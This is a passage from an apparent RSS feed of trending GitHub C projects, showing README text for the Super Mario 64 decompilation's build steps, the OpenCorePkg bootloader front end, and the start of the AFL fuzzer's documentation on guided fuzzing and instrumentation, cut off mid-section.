&lt;h3&gt;&lt;a id="user-content-linux" class="anchor" aria-hidden="true" href="#linux"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Linux&lt;/h3&gt;
&lt;h4&gt;&lt;a id="user-content-1-copy-baseroms-for-asset-extraction" class="anchor" aria-hidden="true" href="#1-copy-baseroms-for-asset-extraction"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;1. Copy baserom(s) for asset extraction&lt;/h4&gt;
&lt;p&gt;For each version (jp/us/eu) that you want to build a ROM for, put an existing ROM at
&lt;code&gt;./baserom.&amp;lt;version&amp;gt;.z64&lt;/code&gt; for asset extraction.&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-2-install-build-dependencies" class="anchor" aria-hidden="true" href="#2-install-build-dependencies"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;2. Install build dependencies&lt;/h4&gt;
&lt;p&gt;The build system has the following package requirements:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;binutils-mips &amp;gt;= 2.27&lt;/li&gt;
&lt;li&gt;python3 &amp;gt;= 3.6&lt;/li&gt;
&lt;li&gt;libaudiofile&lt;/li&gt;
&lt;li&gt;qemu-irix&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Debian / Ubuntu&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo apt install build-essential pkg-config git binutils-mips-linux-gnu python3 zlib1g-dev libaudiofile-dev
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Download latest package from &lt;a href="https://github.com/n64decomp/qemu-irix/releases"&gt;qemu-irix Releases&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo dpkg -i qemu-irix-2.11.0-2169-g32ab296eef_amd64.deb
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;(Optional) Clone &lt;a href="https://github.com/n64decomp/qemu-irix"&gt;https://github.com/n64decomp/qemu-irix&lt;/a&gt; and follow the install instructions in the README.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Arch Linux&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo pacman -S base-devel python audiofile
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Install the following AUR packages:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://aur.archlinux.org/packages/mips64-elf-binutils" rel="nofollow"&gt;mips64-elf-binutils&lt;/a&gt; (AUR)&lt;/li&gt;
&lt;li&gt;&lt;a href="https://aur.archlinux.org/packages/qemu-irix-git" rel="nofollow"&gt;qemu-irix-git&lt;/a&gt; (AUR)&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-3-build-rom" class="anchor" aria-hidden="true" href="#3-build-rom"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;3. Build ROM&lt;/h4&gt;
&lt;p&gt;Run &lt;code&gt;make&lt;/code&gt; to build the ROM (defaults to &lt;code&gt;VERSION=us&lt;/code&gt;). Make sure your path to the repo
is not too long or else this process will error, as the emulated IDO compiler cannot
handle paths longer than 255 characters.
Examples:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;make VERSION=jp -j4       # build (J) version instead with 4 jobs
make VERSION=eu COMPARE=0 # non-matching EU version still WIP
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;&lt;a id="user-content-windows" class="anchor" aria-hidden="true" href="#windows"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Windows&lt;/h2&gt;
&lt;p&gt;For Windows, install WSL and a distro of your choice following
&lt;a href="https://docs.microsoft.com/en-us/windows/wsl/install-win10" rel="nofollow"&gt;Windows Subsystem for Linux Installation Guide for Windows 10&lt;/a&gt;
We recommend either Debian or Ubuntu 18.04 Linux distributions under WSL.&lt;/p&gt;
&lt;p&gt;Then follow the directions in the &lt;a href="#linux"&gt;Linux&lt;/a&gt; installation section above.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-macos" class="anchor" aria-hidden="true" href="#macos"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;macOS&lt;/h2&gt;
&lt;p&gt;macOS is currently unsupported as qemu-irix is unable to be built for macOS host.
The recommended path is installing a Linux distribution under a VM.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-project-structure" class="anchor" aria-hidden="true" href="#project-structure"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Project Structure&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;sm64
├── actors: object behaviors, geo layout, and display lists
├── asm: handwritten assembly code, rom header
│   └── non_matchings: asm for non-matching sections
├── assets: animation and demo data
│   ├── anims: animation data
│   └── demos: demo data
├── bin: asm files for ordering display lists and textures
├── build: output directory
├── data: behavior scripts, misc. data
├── doxygen: documentation infrastructure
├── enhancements: example source modifications
├── include: header files
├── levels: level scripts, geo layout, and display lists
├── lib: SDK library code
├── sound: sequences, sound samples, and sound banks
├── src: C source code for game
│   ├── audio: audio code
│   ├── buffers: stacks, heaps, and task buffers
│   ├── engine: script processing engines and utils
│   ├── game: behaviors and rest of game source
│   ├── goddard: Mario intro screen
│   └── menu: title screen and file, act, and debug level selection menus
├── text: dialog, level names, act names
├── textures: skybox and generic texture data
└── tools: build tools
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;&lt;a id="user-content-contributing" class="anchor" aria-hidden="true" href="#contributing"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contributing&lt;/h2&gt;
&lt;p&gt;Pull requests are welcome. For major changes, please open an issue first to
discuss what you would like to change.&lt;/p&gt;
&lt;p&gt;Run clang-format on your code to ensure it meets the project's coding standards.&lt;/p&gt;
&lt;p&gt;Official discord: &lt;a href="https://discord.gg/27JtCWs" rel="nofollow"&gt;https://discord.gg/27JtCWs&lt;/a&gt;&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>n64decomp</author><guid isPermaLink="false">https://github.com/n64decomp/sm64</guid><pubDate>Tue, 04 Feb 2020 00:03:00 GMT</pubDate></item><item><title>acidanthera/OpenCorePkg #4 in C, This week</title><link>https://github.com/acidanthera/OpenCorePkg</link><description>&lt;p&gt;&lt;i&gt;OpenCore front end&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://github.com/acidanthera/OpenCorePkg/blob/master/Docs/Logos/OpenCore_with_text_Small.png"&gt;&lt;img src="https://github.com/acidanthera/OpenCorePkg/raw/master/Docs/Logos/OpenCore_with_text_Small.png" width="200" height="48" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content--" class="anchor" aria-hidden="true" href="#-"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;a href="https://travis-ci.com/acidanthera/OpenCorePkg" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/db77e5e95b6fb6d136ed05696bd9da939b16ec34/68747470733a2f2f7472617669732d63692e636f6d2f61636964616e74686572612f4f70656e436f7265506b672e7376673f6272616e63683d6d6173746572" alt="Build Status" data-canonical-src="https://travis-ci.com/acidanthera/OpenCorePkg.svg?branch=master" style="max-width:100%;"&gt;&lt;/a&gt; &lt;a href="https://scan.coverity.com/projects/18169" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/52e7e3f4c55e4023af135a707d39f07048b2e776/68747470733a2f2f7363616e2e636f7665726974792e636f6d2f70726f6a656374732f31383136392f62616467652e7376673f666c61743d31" alt="Scan Status" data-canonical-src="https://scan.coverity.com/projects/18169/badge.svg?flat=1" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;OpenCore bootloader front end.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-discussion" class="anchor" aria-hidden="true" href="#discussion"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Discussion&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://applelife.ru/threads/razrabotka-opencore.2943955" rel="nofollow"&gt;AppleLife.ru&lt;/a&gt; in Russian&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.hackintosh-forum.de/forum/thread/42353-opencore-bootloader" rel="nofollow"&gt;Hackintosh-Forum.de&lt;/a&gt; in German&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.insanelymac.com/forum/topic/338527-opencore-development/" rel="nofollow"&gt;InsanelyMac.com&lt;/a&gt; in English&lt;/li&gt;
&lt;li&gt;&lt;a href="https://forums.macrumors.com/threads/opencore-on-the-mac-pro.2207814/" rel="nofollow"&gt;MacRumors.com&lt;/a&gt; in English, legacy Apple hardware&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.macos86.it/showthread.php?4570-OpenCore-aka-OC-Nuovo-BootLoader" rel="nofollow"&gt;macOS86.it&lt;/a&gt; in Italian&lt;/li&gt;
&lt;li&gt;&lt;a href="http://bbs.pcbeta.com/viewthread-1815623-1-1.html" rel="nofollow"&gt;PCbeta.com&lt;/a&gt; in Chinese&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-credits" class="anchor" aria-hidden="true" href="#credits"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Credits&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;The HermitCrabs Lab&lt;/li&gt;
&lt;li&gt;All projects providing third-party code (refer to file headers)&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/al3xtjames"&gt;al3xtjames&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Andrey1970AppleLife"&gt;Andrey1970AppleLife&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Download-Fritz"&gt;Download-Fritz&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Goldfish64"&gt;Goldfish64&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/PMHeart"&gt;PMHeart&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/savvamitrofanov"&gt;savvamitrofanov&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/vit9696"&gt;vit9696&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>acidanthera</author><guid isPermaLink="false">https://github.com/acidanthera/OpenCorePkg</guid><pubDate>Tue, 04 Feb 2020 00:04:00 GMT</pubDate></item><item><title>google/AFL #5 in C, This week</title><link>https://github.com/google/AFL</link><description>&lt;p&gt;&lt;i&gt;american fuzzy lop - a security-oriented fuzzer&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;h1&gt;&lt;a id="user-content-american-fuzzy-lop" class="anchor" aria-hidden="true" href="#american-fuzzy-lop"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;american fuzzy lop&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://travis-ci.org/google/AFL" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/7736dfcaa442d470c541254ee9c73dccec05107e/68747470733a2f2f7472617669732d63692e6f72672f676f6f676c652f41464c2e7376673f6272616e63683d6d6173746572" alt="Build Status" data-canonical-src="https://travis-ci.org/google/AFL.svg?branch=master" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Originally developed by Michal Zalewski &lt;a href="mailto:lcamtuf@google.com"&gt;lcamtuf@google.com&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;See &lt;a href="docs/QuickStartGuide.txt"&gt;QuickStartGuide.txt&lt;/a&gt; if you don't have time to read
this file.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-1-challenges-of-guided-fuzzing" class="anchor" aria-hidden="true" href="#1-challenges-of-guided-fuzzing"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;1) Challenges of guided fuzzing&lt;/h2&gt;
&lt;p&gt;Fuzzing is one of the most powerful and proven strategies for identifying
security issues in real-world software; it is responsible for the vast
majority of remote code execution and privilege escalation bugs found to date
in security-critical software.&lt;/p&gt;
&lt;p&gt;Unfortunately, fuzzing is also relatively shallow; blind, random mutations
make it very unlikely to reach certain code paths in the tested code, leaving
some vulnerabilities firmly outside the reach of this technique.&lt;/p&gt;
&lt;p&gt;There have been numerous attempts to solve this problem. One of the early
approaches - pioneered by Tavis Ormandy - is corpus distillation. The method
relies on coverage signals to select a subset of interesting seeds from a
massive, high-quality corpus of candidate files, and then fuzz them by
traditional means. The approach works exceptionally well, but requires such
a corpus to be readily available. In addition, block coverage measurements
provide only a very simplistic understanding of program state, and are less
useful for guiding the fuzzing effort in the long haul.&lt;/p&gt;
&lt;p&gt;Other, more sophisticated research has focused on techniques such as program
flow analysis ("concolic execution"), symbolic execution, or static analysis.
All these methods are extremely promising in experimental settings, but tend
to suffer from reliability and performance problems in practical uses - and
currently do not offer a viable alternative to "dumb" fuzzing techniques.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-2-the-afl-fuzz-approach" class="anchor" aria-hidden="true" href="#2-the-afl-fuzz-approach"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;2) The afl-fuzz approach&lt;/h2&gt;
&lt;p&gt;American Fuzzy Lop is a brute-force fuzzer coupled with an exceedingly simple
but rock-solid instrumentation-guided genetic algorithm. It uses a modified
form of edge coverage to effortlessly pick up subtle, local-scale changes to
program control flow.&lt;/p&gt;
&lt;p&gt;Simplifying a bit, the overall algorithm can be summed up as:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Load user-supplied initial test cases into the queue,&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Take next input file from the queue,&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Attempt to trim the test case to the smallest size that doesn't alter
the measured behavior of the program,&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Repeatedly mutate the file using a balanced and well-researched variety
of traditional fuzzing strategies,&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;If any of the generated mutations resulted in a new state transition
recorded by the instrumentation, add mutated output as a new entry in the
queue.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Go to 2.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The discovered test cases are also periodically culled to eliminate ones that
have been obsoleted by newer, higher-coverage finds; and undergo several other
instrumentation-driven effort minimization steps.&lt;/p&gt;
&lt;p&gt;As a side result of the fuzzing process, the tool creates a small,
self-contained corpus of interesting test cases. These are extremely useful
for seeding other, labor- or resource-intensive testing regimes - for example,
for stress-testing browsers, office applications, graphics suites, or
closed-source tools.&lt;/p&gt;
&lt;p&gt;The fuzzer is thoroughly tested to deliver out-of-the-box performance far
superior to blind fuzzing or coverage-only tools.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-3-instrumenting-programs-for-use-with-afl" class="anchor" aria-hidden="true" href="#3-instrumenting-programs-for-use-with-afl"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;3) Instrumenting programs for use with AFL&lt;/h2&gt;
&lt;p&gt;When source code is available, instrumentation can be injected by a companion
tool that works as a drop-in replacement for gcc or clang in any standard build
process for third-party code.&lt;/p&gt;
&lt;p&gt;The instrumentation has a fairly modest performance impact; in conjunction with
other optimizations implemented by afl-fuzz, most programs can be fuzzed as fast
or even faster than possible with traditional tools.&lt;/p&gt;
&lt;p&gt;The correct way to recompile the target program may vary depending on the
specifics of the build process, but a nearly-universal approach would be:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;$ CC=/path/to/afl/afl-gcc ./configure
$ make clean all&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;For C++ programs, you'd would also want to set &lt;code&gt;CXX=/path/to/afl/afl-g++&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The clang wrappers (afl-clang and afl-clang++) can be used in the same way;
clang users may also opt to leverage a higher-performance instrumentation mode,
as described in llvm_mode/README.llvm.&lt;/p&gt;
&lt;p&gt;When testing libraries, you need to find or write a simple program that reads
data from stdin or from a file and passes it to the tested library. In such a
case, it is essential to link this executable against a static version of the
instrumented library, or to make sure that the correct .so file is loaded at
runtime (usually by setting &lt;code&gt;LD_LIBRARY_PATH&lt;/code&gt;). The simplest option is a static
build, usually possible via:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;$ CC=/path/to/afl/afl-gcc ./configure --disable-shared&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Setting &lt;code&gt;AFL_HARDEN=1&lt;/code&gt; when calling 'make' will cause the CC wrapper to
automatically enable code hardening options that make it easier to detect
simple memory bugs. Libdislocator, a helper library included with AFL (see
libdislocator/README.dislocator) can help uncover heap corruption issues, too.&lt;/p&gt;
&lt;p&gt;PS. ASAN users are advised to review &lt;a href="docs/notes_for_asan.txt"&gt;notes_for_asan.txt&lt;/a&gt; file for important
caveats.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-4-instrumenting-binary-only-apps" class="anchor" aria-hidden="true" href="#4-instrumenting-binary-only-apps"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;4) Instrumenting binary-only apps&lt;/h2&gt;
&lt;p&gt;When source code is &lt;em&gt;NOT&lt;/em&gt; available, the fuzzer offers experimental support for
fast, on-the-fly instrumentation of black-box binaries. This is accomplished
with a version of QEMU running in the lesser-known "user space emulation" mode.&lt;/p&gt;
&lt;p&gt;QEMU is a project separate from AFL, but you can conveniently build the
feature by doing:&lt;/p&gt;
